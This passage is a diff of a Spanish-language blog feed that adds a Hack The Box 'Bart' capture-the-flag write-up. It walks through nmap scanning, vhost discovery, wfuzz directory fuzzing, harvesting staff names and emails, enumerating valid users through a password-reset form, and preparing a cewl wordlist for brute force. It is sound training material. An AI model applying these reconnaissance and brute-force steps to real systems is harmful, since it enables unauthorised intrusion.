@@ -1,4 +1,430 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-09-27T20:53:55-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Europa</title><link href="http://localhost:4000/htb-europa/" rel="alternate" type="text/html" title="Hack The Box Europa" /><published>2021-09-27T00:00:00-05:00</published><updated>2021-09-27T00:00:00-05:00</updated><id>http://localhost:4000/htb-europa</id><content type="html" xml:base="http://localhost:4000/htb-europa/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-europa/banner-europa.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-10-05T21:15:13-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Bart</title><link href="http://localhost:4000/htb-bart/" rel="alternate" type="text/html" title="Hack The Box Bart" /><published>2021-10-05T00:00:00-05:00</published><updated>2021-10-05T00:00:00-05:00</updated><id>http://localhost:4000/htb-bart</id><content type="html" xml:base="http://localhost:4000/htb-bart/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/banner-bart.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;bart&quot;&gt;Bart&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.81.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.81
+PING 10.10.10.81 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.81&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.81: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;654 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.81 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 654.179/654.179/654.179/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.81 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-27 22:00 CDT
+Initiating SYN Stealth Scan at 22:00
+Scanning 10.10.10.81 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 10.10.10.81
+Completed SYN Stealth Scan at 22:00, 28.50s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.81
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.32s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2021-09-27 22:00:17 CDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;28s
+Not shown: 65534 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;28.69 seconds
+           Raw packets sent: 131088 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;792B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.81
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 80
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.81 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-27 22:01 CDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.81
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.40s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Did not follow redirect to http://forum.bart.htb/
+Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;15.12 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como podemos ver en los resultados obtenidos, se está aplicando &lt;em&gt;Virtual hosting&lt;/em&gt; y vemos la dirección hacia el dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://forum.bart.htb/&lt;/code&gt;, por lo que lo agregamos a nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;, tanto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forum.bart.htb&lt;/code&gt; como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bart.htb&lt;/code&gt;. Una vez realizado esto, hacemos uso de nuestra herramienta de confianza &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; para ver que tecnologías presenta el sitio web; además de que lo visualizamos desde nuestro navegador.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://forum.bart.htb/
+http://forum.bart.htb/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Bootstrap, Country[RESERVED][ZZ], Email[d.simmons@bart.htb,h.potter@bart.htb,info@bart.htb,r.hilton@bart.htb,s.brown@bart.loca,s.brown@bart.local], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.81], JQuery, MetaGenerator[WordPress 4.8.2], Microsoft-IIS[10.0], PoweredBy[WordPress], Script[text/javascript], Title[BART], WordPress[4.8.2]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hay varias cosas interesantes a tener en cuenta. Primero, tenemos unos correos electrónicos que posiblemente nos sirvan posteriormente (es importante guardar dicha info en un archivo). Además, si le echamos un ojo al sitio web, vemos que dicho correos se encuentran relacionados con los usuarios de la sección &lt;em&gt;OUT TEAM&lt;/em&gt;; por lo que seria bueno relacioanar el usuario con su dirección de correo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-team.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al hacer la relación, tenemos algo curioso, nos sobra el correo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;h.potter@bart.htb&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; debido obtener dicho dato desde el código del sitio web; por lo que vamos a filtrar el código por el correo y notamos que las lineas asociadas a dicho usuario están comentadas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-potter.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tambien podríamos aplicar filtrado mediante expresiones regulares con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://forum.bart.htb/ | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 1 &lt;span class=&quot;s2&quot;&gt;&quot;team-info&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\&amp;gt;.*?\&amp;lt;'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;gt;&amp;lt;'&lt;/span&gt;
+Samantha Brown
+Daniel Simmons
+Robert Hilton
+Harvey Potter
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora vemos el uso de &lt;em&gt;Microsoft IIS 10.0&lt;/em&gt; y de &lt;em&gt;WordPress 4.8.2&lt;/em&gt;, lo cual es un poco extraño; sin embargo, si ponemos atención, &lt;em&gt;WordPress&lt;/em&gt; se encuentran catalogado como &lt;em&gt;MetaGenerator&lt;/em&gt;, además si intentamos ingresar al panel de administración de la tecnología, recibimos un código de estado 500 por parte del servidor.&lt;/p&gt;
+
+&lt;p&gt;Como no vemos algo adicional, procedemos a utilzar nuestra herrmienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; para descubrir posibles recursos dentro del sitio web:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2412 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://forum.bart.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work co
+rrectly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://forum.bart.htb/FUZZ                                                                                               
+Total requests: 220560                                                                                                           
+                                                                                                                                 
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                          
+=====================================================================                                                    
+                                                                                                                                 
+000000018:   500        0 L      12 W       75 Ch       &quot;2006&quot;                                                           
+000000026:   500        0 L      12 W       75 Ch       &quot;about&quot;                                                          
+000000042:   500        0 L      12 W       75 Ch       &quot;products&quot;                                                       
+000000048:   500        0 L      12 W       75 Ch       &quot;01&quot;                                                             
+000000050:   500        0 L      12 W       75 Ch       &quot;06&quot;                                                             
+000000049:   500        0 L      12 W       75 Ch       &quot;08&quot;                                                             
+000000051:   500        0 L      12 W       75 Ch       &quot;2&quot;                                                              
+000000047:   500        0 L      12 W       75 Ch       &quot;links&quot;                                                         
+000000046:   500        0 L      12 W       75 Ch       &quot;09&quot;                                                             
+000000038:   500        0 L      12 W       75 Ch       &quot;home&quot;                                                          
+000000043:   500        0 L      12 W       75 Ch       &quot;sitemap&quot;                                                       
+000000036:   500        0 L      12 W       75 Ch       &quot;faq&quot;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que nos sale un código de estado 500, por lo que tambien podriamos tratar de ocultar. Adelantando un poco, no vamos a encontrar nada en dicho dominio; sin embargo, hay que recordar que tenemos el dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bart.htb&lt;/code&gt;, por lo tanto vamos a tratar de hacer &lt;em&gt;fuzzing&lt;/em&gt; con este dominio:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://bart.htb/FUZZ         
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work co
+rrectly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.                                        
+********************************************************                                                                         
+* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                         
+********************************************************                                                                         
+                                                                                                                                 
+Target: http://bart.htb/FUZZ                                                                                                     
+Total requests: 220560                                                                                                           
+                                                                                                                                 
+=====================================================================                                                   
+ID           Response   Lines    Word       Chars       Payload                                                          
+=====================================================================                                                    
+                                                                                                                                 
+000000015:   200        630 L    5628 W     150693 Ch   &quot;index&quot;                                                          
+000000018:   200        630 L    5628 W     150693 Ch   &quot;2006&quot;                                                           
+000000017:   200        630 L    5628 W     150693 Ch   &quot;download&quot;                                                       
+000000016:   200        630 L    5628 W     150693 Ch   &quot;images&quot;                                                        
+000000036:   200        630 L    5628 W     150693 Ch   &quot;faq&quot;                                                            
+000000037:   200        630 L    5628 W     150693 Ch   &quot;rss&quot;                                                           
+000000035:   200        630 L    5628 W     150693 Ch   &quot;cgi-bin&quot;                                                        
+000000032:   200        630 L    5628 W     150693 Ch   &quot;blog&quot;                                                           
+000000019:   200        630 L    5628 W     150693 Ch   &quot;news&quot;                                                           
+000000021:   200        630 L    5628 W     150693 Ch   &quot;serial&quot;                                                         
+000000025:   200        630 L    5628 W     150693 Ch   &quot;contact&quot;                                                       
+000000033:   200        630 L    5628 W     150693 Ch   &quot;new&quot;                                                            
+000000034:   200        630 L    5628 W     150693 Ch   &quot;10&quot;                                                             
+000000030:   200        630 L    5628 W     150693 Ch   &quot;11&quot;                                                             
+000000029:   200        630 L    5628 W     150693 Ch   &quot;privacy&quot;                                                       
+000000039:   200        630 L    5628 W     150693 Ch   &quot;img&quot;                                                           
+000000038:   200        630 L    5628 W     150693 Ch   &quot;home&quot;                                                           
+000000031:   200        630 L    5628 W     150693 Ch   &quot;logo&quot;                                                           
+000000028:   200        630 L    5628 W     150693 Ch   &quot;spacer&quot;                                                         
+000000027:   200        630 L    5628 W     150693 Ch   &quot;search&quot;                                                         
+000000024:   200        630 L    5628 W     150693 Ch   &quot;12&quot;                                                            
+000000026:   200        630 L    5628 W     150693 Ch   &quot;about&quot;                                                         
+000000020:   200        630 L    5628 W     150693 Ch   &quot;crack&quot;                                                          
+000000022:   200        630 L    5628 W     150693 Ch   &quot;warez&quot;                                                          
+000000040:   200        630 L    5628 W     150693 Ch   &quot;default&quot;                                                        
+000000042:   200        630 L    5628 W     150693 Ch   &quot;products&quot;                                                      
+000000046:   200        630 L    5628 W     150693 Ch   &quot;09&quot;                                                             
+000000023:   200        630 L    5628 W     150693 Ch   &quot;full&quot;                                                           
+000000060:   200        630 L    5628 W     150693 Ch   &quot;03&quot;                                                             
+000000058:   200        630 L    5628 W     150693 Ch   &quot;article&quot;                                                       
+000000055:   200        630 L    5628 W     150693 Ch   &quot;support&quot;                                                       
+000000051:   200        630 L    5628 W     150693 Ch   &quot;2&quot;                                                              
+000000048:   200        630 L    5628 W     150693 Ch   &quot;01&quot;                                                             
+000000049:   200        630 L    5628 W     150693 Ch   &quot;08&quot;                                                             
+000000050:   200        630 L    5628 W     150693 Ch   &quot;06&quot;
+000000051:   200        630 L    5628 W     150693 Ch   &quot;2&quot;                                                             
+000000048:   200        630 L    5628 W     150693 Ch   &quot;01&quot;                                                            
+000000049:   200        630 L    5628 W     150693 Ch   &quot;08&quot;                                                            
+000000050:   200        630 L    5628 W     150693 Ch   &quot;06&quot;                                                            
+000000045:   200        630 L    5628 W     150693 Ch   &quot;1&quot;                                                             
+000000047:   200        630 L    5628 W     150693 Ch   &quot;links&quot;                                                         
+000000044:   200        630 L    5628 W     150693 Ch   &quot;archives&quot;                                                      
+000000041:   200        630 L    5628 W     150693 Ch   &quot;2005&quot;                                                          
+000000043:   200        630 L    5628 W     150693 Ch   &quot;sitemap&quot;                                                       
+000000053:   200        630 L    5628 W     150693 Ch   &quot;login&quot;                                                         
+000000067:   301        1 L      10 W       145 Ch      &quot;forum&quot;                                                         
+000000057:   200        630 L    5628 W     150693 Ch   &quot;keygen&quot;                                                        
+000000056:   200        630 L    5628 W     150693 Ch   &quot;05&quot;                                                            
+000000054:   200        630 L    5628 W     150693 Ch   &quot;articles&quot;                                                      
+000000059:   200        630 L    5628 W     150693 Ch   &quot;04&quot;                                                            
+000000052:   200        630 L    5628 W     150693 Ch   &quot;07&quot;                                                            
+000000061:   200        630 L    5628 W     150693 Ch   &quot;help&quot;                                                          
+000000063:   200        630 L    5628 W     150693 Ch   &quot;archive&quot;                                                       
+000000075:   200        630 L    5628 W     150693 Ch   &quot;content&quot;                                                       
+000000078:   200        630 L    5628 W     150693 Ch   &quot;15&quot;                                                            
+000000077:   200        630 L    5628 W     150693 Ch   &quot;main&quot;                                                          
+000000074:   200        630 L    5628 W     150693 Ch   &quot;4&quot;                                                             
+000000072:   200        630 L    5628 W     150693 Ch   &quot;13&quot;                                                            
+000000071:   200        630 L    5628 W     150693 Ch   &quot;security&quot;                                                      
+000000073:   200        630 L    5628 W     150693 Ch   &quot;category&quot;                                                      
+000000076:   200        630 L    5628 W     150693 Ch   &quot;14&quot;                                                            
+000000079:   200        630 L    5628 W     150693 Ch   &quot;press&quot;                                                         
+000000070:   200        630 L    5628 W     150693 Ch   &quot;3&quot;                                                             
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 0
+Processed Requests: 73
+Filtered Requests: 14
+Requests/sec.: 0
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como podemos observar, vemos que para cualquier recurso se tiene un código de estado 200 y lo podemos valir vía web:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-loquesea.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para nuestro caso, tenemos que en la línea &lt;em&gt;000000067&lt;/em&gt; tenemos un código de estado 301, por lo que podemos tratar de buscar dicho código:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--sc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;301 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://bart.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://bart.htb/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000067:   301        1 L      10 W       145 Ch      &quot;forum&quot;                                                         
+000001614:   301        1 L      10 W       147 Ch      &quot;monitor&quot;                                                       
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+
+Total time: 0
+Processed Requests: 1636
+Filtered Requests: 1634
+Requests/sec.: 0
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos dos recursos, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forum&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;monitor&lt;/code&gt;, por lo que vamos a echarles un ojo. Para el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forum&lt;/code&gt; nos mandan a lo que veíamos en http://forum.bart.htb/ y en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;monitor&lt;/code&gt; tenemos un panel de login.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-monitor.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hay que recordar que tenemos nombre de usuarios, por lo que podríamos probarlos para verificar si existen dentro del panel de login. En la opción &lt;strong&gt;Forgot password?&lt;/strong&gt; podemos validar introduciendo el nombre de los usuarios.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que los usuarios válidos son: &lt;strong&gt;&lt;em&gt;Daniel&lt;/em&gt;&lt;/strong&gt; y &lt;strong&gt;&lt;em&gt;Harvey&lt;/em&gt;&lt;/strong&gt;. Ahora podríamos tratar de efectuar un ataque de fuerza bruta para obtener las posibles contraseñas de dichos usuarios. Primeramente vamos a creamos un diccionario a partir del sitio web mediante el uso de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cewl&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ cewl &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; diccionario.txt http://forum.bart.htb/
+CeWL 5.4.8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Inclusion&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Robin Wood &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robin@digi.ninja&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://digi.ninja/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;diccionario.txt | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[A-Z]'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[a-z]'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dictionary.txt
